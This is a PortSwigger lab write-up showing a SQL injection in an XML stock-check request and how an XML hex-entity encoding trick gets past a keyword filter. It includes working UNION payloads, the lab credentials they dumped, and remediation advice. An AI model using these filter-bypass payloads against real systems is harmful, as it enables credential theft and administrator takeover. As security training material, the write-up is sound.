# SQL Injection with Filter Bypass via XML Encoding

- **Lab:** SQL injection with filter bypass via XML encoding
- **Platform:** PortSwigger Web Security Academy
- **Category:** SQL Injection (OWASP A03:2021, Injection)
- **Difficulty:** Practitioner
- **Tool:** Burp Suite (Repeater), Hackvertor extension
- **URL:** https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding

## Environment & Scope

Isolated training lab on PortSwigger's Web Security Academy. Each lab runs on a dedicated, disposable instance tied to my own account. No third-party or production systems were involved.

## Objective

The product page has a "Check stock" feature that sends its request as an XML document. The `storeId` value in that document is placed into a SQL query, so it is injectable. A filter, a WAF-style keyword block, sits in front of the query and rejects recognisable SQL injection. The goal is to get past the filter, read the users table, and log in as `administrator`.

## Reconnaissance

Clicking "Check stock" sends a POST request with an XML body:

```
POST /product/stock
Content-Type: application/xml
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>2</productId>
    <storeId>3</storeId>
</stockCheck>
```

The `storeId` value is the injection point. This is a different shape from the earlier labs: the payload goes inside an XML element in a POST body, not a URL parameter, so the work happens in Burp Repeater.

## Exploitation

### Step 1: Confirm there is a filter

Setting `storeId` to a plain UNION probe:

```
<storeId>1 UNION SELECT NULL</storeId>
```

returned **"Attack detected"** instead of a result. The injection point is real, but a filter recognises keywords such as `UNION` and `SELECT` and blocks the request before it reaches the database.

### Step 2: Bypass the filter with XML entity encoding

The filter inspects the raw bytes of the request, but the server's XML parser decodes XML character entities before the value is used. If I encode the payload as entities, the two see different things: the filter sees `&#x55;...` and finds no keyword, while the parser decodes it back to `UNION` before it reaches the SQL.

I used the Hackvertor extension to do the encoding, wrapping the payload in its `<@hex_entities>` tag:

```
<storeId><@hex_entities>1 UNION SELECT NULL</@hex_entities></storeId>
```

On send, Hackvertor converts the inner text to hex HTML entities. The response came back normally:

```
706 units
null
```

"Attack detected" was gone, so the filter was bypassed. The `706 units` is the original query's result and the `null` is my injected `UNION SELECT NULL`. That confirms three things at once: the filter is defeated, the query returns a single column, and that column is reflected in the response.

### Step 3: Read the credentials

With a single visible column, I concatenated username and password into it, separated by `~`, still inside the encoding tag:

```
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
```

`||` is PostgreSQL string concatenation, which packs both fields into the one column the query allows. The response returned every user:

```
carlos~yqf3km5qg1wq5e762n4l
706 units
wiener~o5rs2hcyczcq57up3z3e
administrator~9l8ywxag2hx8yg2cv78h
```

### Step 4: Log in

Using `administrator` with the password `9l8ywxag2hx8yg2cv78h` I logged in as the administrator. **Lab solved.** The values are from a disposable lab instance and are already dead.

## Impact

A keyword filter in front of the query gave the appearance of protection, but the query was still built from raw input and was fully injectable. Encoding the payload defeated the filter and exposed every user's credentials in a single request, leading to administrator takeover. The filter changed nothing about the root cause. It only had to be encoded around.

## Remediation

- **Parameterised queries (prepared statements).** This is the root fix. Bound input cannot alter the query no matter how it is encoded, so the filter becomes unnecessary.
- **Do not rely on a keyword filter or WAF as the control.** It is defence in depth at best. A filter that inspects a different representation than the parser acts on can always be bypassed through encoding, as here.
- **Least privilege** for the database account, so the stock-check query cannot read the `users` table at all.
- **Store passwords as salted hashes, never in plaintext.**

## Key takeaway

The bypass works because the filter and the parser disagree on what the bytes mean. The filter scans the request as sent, sees encoded entities, and finds no keywords. The XML parser decodes those entities first, so the database receives `UNION SELECT` after all. Any filter placed before a decoding step can be walked straight past by encoding the payload into the form that only the decoder understands. Blocking strings is not the fix. Parameterising the query is.
